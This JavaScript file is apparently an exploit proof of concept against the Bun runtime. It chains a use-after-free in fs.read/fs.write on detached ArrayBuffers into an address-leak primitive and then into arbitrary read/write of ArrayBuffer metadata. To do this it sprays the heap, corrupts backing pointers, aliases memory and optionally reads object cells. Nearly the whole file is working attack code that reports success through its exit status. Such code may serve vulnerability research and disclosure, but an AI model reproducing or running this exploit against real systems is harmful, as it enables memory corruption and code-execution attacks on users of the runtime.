// No-FFI bridge from the fs.read BufferSource UAF addrof primitive to
// ArrayBuffer metadata read/write.
//
// This combines two already-local primitives:
//   * addrof(target) from the 8KB object-array reclaim leak,
//   * UAF_SIZE=128 / WRITE_OFFSET=16 ArrayBuffer metadata pointer corruption.
//
// The harness leaks addrof(victimBuffer), writes that JSCell/native object
// address into the backing-pointer field of a sprayed 128-byte ArrayBuffer
// carrier, then constructs a fresh view over the corrupted carrier. If the
// bridge works, the fresh view reads the victim ArrayBuffer object's native
// metadata directly. It then rewrites the victim's own backing pointer to
// backing+SHIFT and proves that a fresh view over victimBuffer aliases that
// shifted native address. Finally it restores the victim pointer.
//
// No bun:ffi, no native helper dylib, no symbol lookup.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 12);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const bridgeKind = process.env.BRIDGE_KIND || "u8";
const shift = Number(process.env.SHIFT || 16);
const aliasWrite = Number(process.env.ALIAS_WRITE || 0x5a) & 0xff;
const dataPtrOffset = Number(process.env.DATA_PTR_OFFSET || 16);
const byteLengthOffset = Number(process.env.BYTE_LENGTH_OFFSET || 48);
const maxByteLengthOffset = Number(process.env.MAX_BYTE_LENGTH_OFFSET || 56);
const requireLengthFields = process.env.REQUIRE_LENGTH_FIELDS === "1";
const secondStage = process.env.SECOND_STAGE === "1";
const secondStageMutate = process.env.SECOND_STAGE_MUTATE === "1";
const cellRead = process.env.CELL_READ === "1";
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const scanBytes = Number(process.env.SCAN_BYTES || 96);

if (writeOffset < 0 || writeOffset + 8 > uafSize) {
  throw new Error("WRITE_OFFSET must leave room for one qword inside UAF_SIZE");
}
if (shift < 0 || shift >= viewSize) {
  throw new Error("SHIFT must be inside the victim backing store");
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value, width = 16) {
  return `0x${value.toString(16).padStart(width, "0")}`;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-addrof-ab-arw-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(fifo.path); } catch {}
}

function isAgain(error) {
  return error?.code === "EAGAIN" || error?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (error) {
      if (isAgain(error)) break;
      throw error;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;

  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (error) {
      if (!isAgain(error)) throw error;
    }

    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }

  return Buffer.concat(chunks, total);
}

function readU64LEBytes(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function readU64LE(view, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(view[offset + i]);
  return value;
}

function writeU64LE(view, offset, value) {
  let v = value;
  for (let i = 0; i < 8; i++) {
    view[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
}

function payloadU64(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function isPointerLike(value) {
  return value >= 0x0000100000000000n &&
    value <= 0x00007ffffffffffen &&
    (value & 0x7n) === 0n;
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);

    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();

    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof-leak");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

function makeBridgeCarrier(index) {
  const fill = (0x71 + (index & 15)) & 0xff;
  switch (bridgeKind) {
    case "arraybuffer": {
      const ab = new ArrayBuffer(viewSize);
      new Uint8Array(ab).fill(fill);
      return ab;
    }
    case "u8": {
      const view = new Uint8Array(new ArrayBuffer(viewSize));
      view.fill(fill);
      return view;
    }
    case "dataview": {
      const ab = new ArrayBuffer(viewSize);
      new Uint8Array(ab).fill(fill);
      return new DataView(ab);
    }
    default:
      throw new Error("BRIDGE_KIND must be arraybuffer, u8, or dataview");
  }
}

function carrierBuffer(carrier) {
  return carrier instanceof ArrayBuffer ? carrier : carrier.buffer;
}

function freshCarrierBytes(carrier) {
  return new Uint8Array(carrierBuffer(carrier));
}

function existingCarrierBytes(carrier) {
  if (carrier instanceof ArrayBuffer) return new Uint8Array(carrier);
  if (carrier instanceof DataView) return new Uint8Array(carrier.buffer, carrier.byteOffset, carrier.byteLength);
  return new Uint8Array(carrier.buffer, carrier.byteOffset, carrier.byteLength);
}

function allocateBridgeCarriers() {
  const retained = [];
  for (let i = 0; i < sprayCount; i++) retained.push(makeBridgeCarrier(i));
  return retained;
}

async function corruptBridgeToVictim(victimAddress) {
  const path = join(tmpdir(), `bun-addrof-ab-arw-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);

  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);

    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });

    detach(ab);
    gcNow();
    const bridgeCarriers = allocateBridgeCarriers();
    gcNow();

    fs.writeSync(fd, payloadU64(victimAddress), 0, 8);
    const result = await done;
    return { bridgeCarriers, bytesRead: result.bytesRead, err: result.err?.message };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findMetadataBridge(bridgeCarriers) {
  const anomalies = [];
  for (let i = 0; i < bridgeCarriers.length; i++) {
    try {
      const fresh = freshCarrierBytes(bridgeCarriers[i]);
      if (fresh.length < 64) continue;
      const expected = (0x71 + (i & 15)) & 0xff;
      const looksRemapped = fresh[0] !== expected;
      const dataPtr = readU64LE(fresh, dataPtrOffset);
      const byteLength = readU64LE(fresh, byteLengthOffset);
      const maxByteLength = readU64LE(fresh, maxByteLengthOffset);
      const lengthFieldsMatch = byteLength === BigInt(viewSize) && maxByteLength === BigInt(viewSize);
      if (looksRemapped && isPointerLike(dataPtr) && (!requireLengthFields || lengthFieldsMatch)) {
        return { kind: "metadata", index: i, fresh, dataPtr, byteLength, maxByteLength, anomalies };
      }

      if (looksRemapped) {
        const words = [];
        for (let offset = 0; offset + 8 <= Math.min(scanBytes, fresh.length); offset += 8) {
          const value = readU64LE(fresh, offset);
          words.push({ offset, value: hex(value), pointerLike: isPointerLike(value) });
        }
        anomalies.push({
          index: i,
          expected,
          first: fresh[0],
          prefix: [...fresh.subarray(0, Math.min(scanBytes, fresh.length))],
          words,
        });
        if (anomalies.length >= 4) return { kind: "anomalous", anomalies };
      }
    } catch {}
  }
  return anomalies.length > 0 ? { kind: "anomalous", anomalies } : null;
}

const victimBuffer = new ArrayBuffer(viewSize);
const victimOriginal = new Uint8Array(victimBuffer);
for (let i = 0; i < victimOriginal.length; i++) victimOriginal[i] = (0xa0 + (i & 31)) & 0xff;

const victimAddress = await addrof(victimBuffer);
let bridgeResult = null;
let bridge = null;
for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
  bridgeResult = await corruptBridgeToVictim(victimAddress);
  bridge = findMetadataBridge(bridgeResult.bridgeCarriers);
  if (bridge) {
    bridge.attempt = attempt;
    break;
  }
}

if (!bridge || bridge.kind !== "metadata") {
  console.log(JSON.stringify({
    final: true,
    result: bridge ? "bridge-layout-not-mapped" : "no-bridge",
    victimAddress: hex(victimAddress),
    bridgeKind,
    uafSize,
    viewSize,
    sprayCount,
    bridgeAttempts,
    dataPtrOffset,
    byteLengthOffset,
    maxByteLengthOffset,
    requireLengthFields,
    bytesRead: bridgeResult?.bytesRead,
    err: bridgeResult?.err,
    bridge: bridge && {
      kind: bridge.kind,
      attempt: bridge.attempt,
      anomalies: bridge.anomalies,
    },
  }, null, 2));
  process.exit(1);
}

const victimDataPtr = bridge.dataPtr;
const beforeShiftByte = victimOriginal[shift];
const shiftedPtr = victimDataPtr + BigInt(shift);
const bridgePrefix = [...bridge.fresh.subarray(0, Math.min(scanBytes, bridge.fresh.length))];
const bridgeWords = [];
for (let offset = 0; offset + 8 <= Math.min(scanBytes, bridge.fresh.length); offset += 8) {
  const value = readU64LE(bridge.fresh, offset);
  bridgeWords.push({ offset, value: hex(value), pointerLike: isPointerLike(value) });
}

console.log(JSON.stringify({
  phase: "bridge-mapped",
  bridgeKind,
  bridgeIndex: bridge.index,
  bridgeAttempt: bridge.attempt,
  victimAddress: hex(victimAddress),
  assumedDataPtrOffset: dataPtrOffset,
  assumedVictimDataPtr: hex(victimDataPtr),
  bridgePrefix,
  bridgeWords,
}, null, 2));

if (secondStage) {
  let stage2Result = null;
  let stage2Bridge = null;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    stage2Result = await corruptBridgeToVictim(victimDataPtr);
    stage2Bridge = findMetadataBridge(stage2Result.bridgeCarriers);
    if (stage2Bridge) {
      stage2Bridge.attempt = attempt;
      break;
    }
  }
  const stage2Summary = {
    phase: "second-stage",
    targetAddress: hex(victimDataPtr),
    attempts: bridgeAttempts,
    bytesRead: stage2Result?.bytesRead,
    err: stage2Result?.err,
    bridge: stage2Bridge && {
      kind: stage2Bridge.kind,
      index: stage2Bridge.index,
      attempt: stage2Bridge.attempt,
      dataPtr: stage2Bridge.dataPtr !== undefined ? hex(stage2Bridge.dataPtr) : undefined,
      byteLength: stage2Bridge.byteLength !== undefined ? hex(stage2Bridge.byteLength) : undefined,
      maxByteLength: stage2Bridge.maxByteLength !== undefined ? hex(stage2Bridge.maxByteLength) : undefined,
      prefix: stage2Bridge.fresh ? [...stage2Bridge.fresh.subarray(0, Math.min(scanBytes, stage2Bridge.fresh.length))] : undefined,
      words: stage2Bridge.fresh ? Array.from({ length: Math.min(Math.trunc(scanBytes / 8), Math.trunc(stage2Bridge.fresh.length / 8)) }, (_, i) => {
        const offset = i * 8;
        const value = readU64LE(stage2Bridge.fresh, offset);
        return { offset, value: hex(value), pointerLike: isPointerLike(value) };
      }) : undefined,
      anomalies: stage2Bridge.anomalies,
    },
  };

  if (stage2Bridge?.kind === "metadata" && secondStageMutate) {
    const stage2DataPtr = stage2Bridge.dataPtr;
    const stage2ShiftedPtr = stage2DataPtr + BigInt(shift);
    const stage2BeforeShiftByte = victimOriginal[shift];
    let stage2ShiftedFirstBefore;
    let stage2ShiftedFirstAfter;
    let stage2OriginalAtShiftAfter;
    let stage2RestoredFirst;
    let stage2MutationError;

    try {
      writeU64LE(stage2Bridge.fresh, dataPtrOffset, stage2ShiftedPtr);
      const shiftedView = new Uint8Array(victimBuffer);
      stage2ShiftedFirstBefore = shiftedView[0];
      shiftedView[0] = aliasWrite;
      stage2ShiftedFirstAfter = shiftedView[0];
      stage2OriginalAtShiftAfter = victimOriginal[shift];
    } catch (error) {
      stage2MutationError = error?.message || String(error);
    } finally {
      try { writeU64LE(stage2Bridge.fresh, dataPtrOffset, stage2DataPtr); } catch {}
    }

    try {
      const restoredView = new Uint8Array(victimBuffer);
      stage2RestoredFirst = restoredView[0];
    } catch (error) {
      if (!stage2MutationError) stage2MutationError = `restore:${error?.message || String(error)}`;
    }

    stage2Summary.mutation = {
      dataPtr: hex(stage2DataPtr),
      shiftedPtr: hex(stage2ShiftedPtr),
      shift,
      beforeShiftByte: stage2BeforeShiftByte,
      shiftedFirstBefore: stage2ShiftedFirstBefore,
      shiftedFirstAfter: stage2ShiftedFirstAfter,
      originalAtShiftAfter: stage2OriginalAtShiftAfter,
      restoredFirst: stage2RestoredFirst,
      mutationError: stage2MutationError,
      ok:
        !stage2MutationError &&
        stage2ShiftedFirstBefore === stage2BeforeShiftByte &&
        stage2ShiftedFirstAfter === aliasWrite &&
        stage2OriginalAtShiftAfter === aliasWrite &&
        stage2RestoredFirst === victimOriginal[0],
    };
  }

  if (stage2Bridge?.kind === "metadata" && cellRead) {
    const cellTarget = { marker: `cell-read-${Date.now()}`, a: 13.37, b: victimBuffer };
    const cellAddress = await addrof(cellTarget);
    let cellPrefix;
    let cellReadError;
    try {
      writeU64LE(stage2Bridge.fresh, dataPtrOffset, cellAddress);
      const cellView = new Uint8Array(victimBuffer);
      cellPrefix = [...cellView.subarray(0, 32)];
    } catch (error) {
      cellReadError = error?.message || String(error);
    } finally {
      try { writeU64LE(stage2Bridge.fresh, dataPtrOffset, stage2Bridge.dataPtr); } catch {}
    }

    stage2Summary.cellRead = {
      cellAddress: hex(cellAddress),
      cellPrefix,
      cellReadError,
      ok: !cellReadError && Array.isArray(cellPrefix) && cellPrefix.length === 32,
    };
  }

  console.log(JSON.stringify(stage2Summary, null, 2));
  process.exitCode =
    stage2Summary.cellRead ? (stage2Summary.cellRead.ok ? 86 : 1) :
    stage2Summary.mutation ? (stage2Summary.mutation.ok ? 86 : 1) :
    (stage2Bridge ? 86 : 1);
  process.exit();
}

let shiftedFirstBefore;
let shiftedFirstAfter;
let originalAtShiftAfter;
let restoredFirst;
let mutationError;
try {
  writeU64LE(bridge.fresh, dataPtrOffset, shiftedPtr);
  const shiftedView = new Uint8Array(victimBuffer);
  shiftedFirstBefore = shiftedView[0];
  shiftedView[0] = aliasWrite;
  shiftedFirstAfter = shiftedView[0];
  originalAtShiftAfter = victimOriginal[shift];
} catch (error) {
  mutationError = error?.message || String(error);
} finally {
  try { writeU64LE(bridge.fresh, dataPtrOffset, victimDataPtr); } catch {}
}

try {
  const restoredView = new Uint8Array(victimBuffer);
  restoredFirst = restoredView[0];
} catch (error) {
  if (!mutationError) mutationError = `restore:${error?.message || String(error)}`;
}

const existingCarrier = existingCarrierBytes(bridgeResult.bridgeCarriers[bridge.index]);

const ok =
  !mutationError &&
  isPointerLike(victimAddress) &&
  isPointerLike(victimDataPtr) &&
  shiftedFirstBefore === beforeShiftByte &&
  shiftedFirstAfter === aliasWrite &&
  originalAtShiftAfter === aliasWrite &&
  restoredFirst === victimOriginal[0];

console.log(JSON.stringify({
  final: true,
  result: ok ? "metadata-arw-bridge-confirmed" : "metadata-arw-bridge-incomplete",
  bridgeKind,
  bridgeIndex: bridge.index,
  uafSize,
  viewSize,
  sprayCount,
  bridgeAttempts,
  bridgeAttempt: bridge.attempt,
  writeOffset,
  dataPtrOffset,
  byteLengthOffset,
  maxByteLengthOffset,
  requireLengthFields,
  victimAddress: hex(victimAddress),
  victimDataPtr: hex(victimDataPtr),
  victimByteLength: hex(bridge.byteLength),
  victimMaxByteLength: hex(bridge.maxByteLength),
  shift,
  shiftedPtr: hex(shiftedPtr),
  beforeShiftByte,
  shiftedFirstBefore,
  shiftedFirstAfter,
  originalAtShiftAfter,
  restoredFirst,
  mutationError,
  bridgePrefix,
  bridgeWords,
  existingCarrierFirst: existingCarrier[0],
  bridgeBytesRead: bridgeResult.bytesRead,
  bridgeErr: bridgeResult.err,
}, null, 2));

process.exitCode = ok ? 86 : 1;
